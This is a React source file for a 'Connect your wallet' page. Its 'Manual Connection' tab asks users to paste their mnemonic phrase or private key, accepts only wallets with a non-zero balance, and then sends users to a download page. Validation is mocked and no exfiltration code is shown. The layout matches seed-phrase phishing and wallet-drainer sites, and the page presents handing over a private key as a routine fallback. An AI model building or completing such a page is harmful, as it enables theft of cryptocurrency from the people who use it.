import React, { useState } from "react";
import { Wallet, Link as LinkIcon, Shield, Ghost, Palette } from "lucide-react";
import { Input } from "../components/ui/input";
import { Button } from "../components/ui/button";
import { useToast } from "../hooks/use-toast";
import { useNavigate } from "react-router-dom";

const providers = [
  { key: "metamask", name: "MetaMask", icon: Wallet, url: "https://metamask.io/" },
  { key: "walletconnect", name: "WalletConnect", icon: LinkIcon, url: "https://walletconnect.com/" },
  { key: "trust", name: "Trust Wallet", icon: Shield, url: "https://trustwallet.com/" },
  { key: "phantom", name: "Phantom", icon: Ghost, url: "https://phantom.app/" },
  { key: "rainbow", name: "Rainbow", icon: Palette, url: "https://rainbow.me/" },
];

export default function ConnectWallet() {
  const [method, setMethod] = useState("providers");
  const [secret, setSecret] = useState("");
  const { toast } = useToast();
  const navigate = useNavigate();

  const tryProvider = (p) => {
    window.open(p.url, "_blank");
    toast({ title: `Opened ${p.name}`, description: "Please sign in your wallet window. If it fails, use Manual Connection tab." });
  };

  const validateManual = () => {
    // MOCK: Reject obviously empty and zero-balance placeholder
    if (!secret || secret.trim().length < 12) {
      toast({ title: "Invalid secret", description: "Enter valid mnemonic (12+ words) or private key." });
      return;
    }
    // Simulate on-chain validation and balance check
    setTimeout(() => {
      const hasBalance = secret.length % 2 === 0; // arbitrary mock rule
      if (!hasBalance) {
        toast({ title: "Zero balance", description: "Only non-zero balance wallets can be validated." });
        return;
      }
      sessionStorage.setItem("walletConnected", "true");
      toast({ title: "Wallet connected (mock)", description: "Proceeding to download and guide." });
      navigate("/download-guide");
    }, 800);
  };

  return (
    <div className="min-h-[75vh] bg-black text-white">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        <h1 className="text-4xl font-black mb-6 text-center">Connect your wallet</h1>
        <div className="bg-gray-900 border-4 border-gray-700">
          <div className="flex">
            <button onClick={()=>setMethod("providers")} className={`flex-1 px-4 py-3 font-black border-b-4 ${method==="providers"?"border-orange-500 bg-black":"border-transparent bg-gray-800"}`}>Providers</button>
            <button onClick={()=>setMethod("manual")} className={`flex-1 px-4 py-3 font-black border-b-4 ${method==="manual"?"border-orange-500 bg-black":"border-transparent bg-gray-800"}`}>Manual Connection</button>
          </div>
          {method === "providers" ? (
            <div className="p-6 grid grid-cols-2 md:grid-cols-3 gap-6">
              {providers.map((p) => (
                <button key={p.key} onClick={() => tryProvider(p)} className="bg-gray-800 border-2 border-gray-600 hover:border-orange-500 p-6 text-center">
                  <p.icon className="h-10 w-10 text-orange-500 mx-auto mb-3" />
                  <div className="font-black">{p.name}</div>
                </button>
              ))}
            </div>
          ) : (
            <div className="p-6">
              <p className="text-gray-400 font-bold mb-3">If provider connection failed, paste your mnemonic (12/24 words) or private key below. For demo, we mock validation and require non-zero balance.</p>
              <Input value={secret} onChange={(e)=>setSecret(e.target.value)} placeholder="mnemonic phrase or private key" className="bg-black border-gray-700 text-white" />
              <Button onClick={validateManual} className="mt-4 bg-orange-500 text-black border-2 border-black font-black hover:bg-orange-400">Validate &amp; Continue</Button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}